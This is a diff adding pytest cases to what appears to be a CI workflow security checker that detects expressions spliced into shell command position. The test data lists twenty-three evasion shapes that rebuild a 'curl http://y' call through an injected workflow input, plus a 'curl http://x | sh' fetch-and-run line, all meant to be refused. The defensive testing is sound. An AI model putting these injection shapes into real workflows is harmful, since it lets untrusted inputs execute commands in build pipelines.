@@ -7033,3 +7033,95 @@ def test_shell_sink_promotion_stays_inside_its_own_pipeline() -> None:
     """
     run = 'if [ "${{ steps.filter.outputs.agents }}" = "true" ]; then\n  curl http://x | sh\nfi'
     assert policy._splices_expression_into_command_word(run) is False
+
+
+# Adversarial review round 3 against the tokenizer that replaced the separator
+# scan. Sixty-five shapes were probed; these are the twenty-three that defeated
+# the first tokenizer. Refs #3673.
+_TOKENIZER_EVASIONS = (
+    pytest.param("bash <<< \"c${{ inputs.x }}url http://y | sh\"", id="here-string"),
+    pytest.param("coproc c${{ inputs.x }}url http://y", id="coproc"),
+    pytest.param("builtin c${{ inputs.x }}url http://y", id="builtin-prefix"),
+    pytest.param("sudo c${{ inputs.x }}url http://y", id="sudo-prefix"),
+    pytest.param("setsid c${{ inputs.x }}url http://y", id="setsid-prefix"),
+    pytest.param("stdbuf -o0 c${{ inputs.x }}url http://y", id="stdbuf-prefix"),
+    pytest.param("case x in\n  x) c${{ inputs.x }}url http://y ;;\nesac", id="case-pattern"),
+    pytest.param(
+        "case x in\n  x) : ;& y) c${{ inputs.x }}url http://y ;;\nesac",
+        id="case-fallthrough",
+    ),
+    pytest.param(
+        "case x in\n  x) : ;;& y) c${{ inputs.x }}url http://y ;;\nesac",
+        id="case-resume",
+    ),
+    pytest.param("echo hi > >(c${{ inputs.x }}url http://y)", id="process-substitution-out"),
+    pytest.param("source /dev/stdin <<< \"c${{ inputs.x }}url http://y\"", id="source-sink"),
+    pytest.param(". /dev/stdin <<< \"c${{ inputs.x }}url http://y\"", id="dot-source-sink"),
+    pytest.param("echo 'c${{ inputs.x }}url' | python3 -c 'pass'", id="python-inline-sink"),
+    pytest.param("echo 'c${{ inputs.x }}url' | perl -e 'system(<>)'", id="perl-inline-sink"),
+    pytest.param("echo 'c${{ inputs.x }}url' | node -e 'x'", id="node-inline-sink"),
+    pytest.param("echo 'c${{ inputs.x }}url' | awk '{system($0)}'", id="awk-sink"),
+    pytest.param("ssh host \"c${{ inputs.x }}url http://y\"", id="ssh-sink"),
+    pytest.param("find . -exec c${{ inputs.x }}url http://y \\;", id="find-exec-sink"),
+    pytest.param("script -qc \"c${{ inputs.x }}url http://y\" /dev/null", id="script-sink"),
+    pytest.param("echo 'c${{ inputs.x }}url' | ruby -e 'x'", id="ruby-inline-sink"),
+    pytest.param(
+        "echo 'c${{ inputs.x }}url http://y' | while read l; do eval \"$l\"; done",
+        id="piped-into-compound-eval",
+    ),
+    pytest.param("CMD=c${{ inputs.x }}url; $CMD http://y", id="assignment-then-expansion"),
+    pytest.param("bash <(echo c${{ inputs.x }}url http://y)", id="process-substitution-in"),
+)
+
+
+@pytest.mark.parametrize("run", _TOKENIZER_EVASIONS)
+def test_tokenizer_evasions_are_refused_tolerance(run: str) -> None:
+    """Round-three shapes that reached command position are all refused.
+
+    Each defeated the first tokenizer: a missing sink, a compound command that
+    broke the pipeline, a here-string or process substitution swallowed as a
+    redirect target, or an expression followed through an assignment.
+    """
+    assert policy._splices_expression_into_command_word(run) is True
+
+
+def test_unbalanced_quote_splice_is_blocked_by_the_syntax_check() -> None:
+    """The one shape the tokenizer misses is caught downstream.
+
+    An unterminated quote swallows the spliced word into an argument, so the
+    tokenizer allows it. The body is not valid shell, so the syntax check
+    refuses the tolerance before the allowance can matter. Recorded here so a
+    later change to either half cannot silently open the hole.
+    """
+    run = 'echo "unterminated\nc${{ inputs.x }}url http://y'
+    assert policy._splices_expression_into_command_word(run) is False
+    assert policy._body_is_valid_shell_syntax(run) is False
+    assert policy._step_defeats_bash_subparse("bash", run) is False
+
+
+def test_script_interpreters_are_sinks_only_with_an_inline_code_flag() -> None:
+    """Running a script file does not promote its arguments to command position.
+
+    Adding ``python3`` to the sink set without this test refused
+    ``python3 build.py --tag "v${{ inputs.version }}"``, a shape that appears in
+    real workflows.
+    """
+    assert policy._splices_expression_into_command_word(
+        'python3 build.py --tag "v${{ inputs.version }}"'
+    ) is False
+    assert policy._splices_expression_into_command_word(
+        "echo 'c${{ inputs.x }}url' | python3 -c 'pass'"
+    ) is True
+
+
+def test_tainted_variable_must_be_the_whole_command_word() -> None:
+    """A tainted name inside a larger command word is an argument, not a command.
+
+    Following assignments without this rule refused agent-metrics.yml, where
+    ``COVERAGE="${{ ... }}"`` is later read inside ``$(echo "$COVERAGE >= 50" |
+    bc -l)``.
+    """
+    assert policy._splices_expression_into_command_word(
+        'COVERAGE="${{ steps.check.outputs.coverage }}"\n'
+        'if (( $(echo "$COVERAGE >= 50" | bc -l) )); then echo ok; fi'
+    ) is False
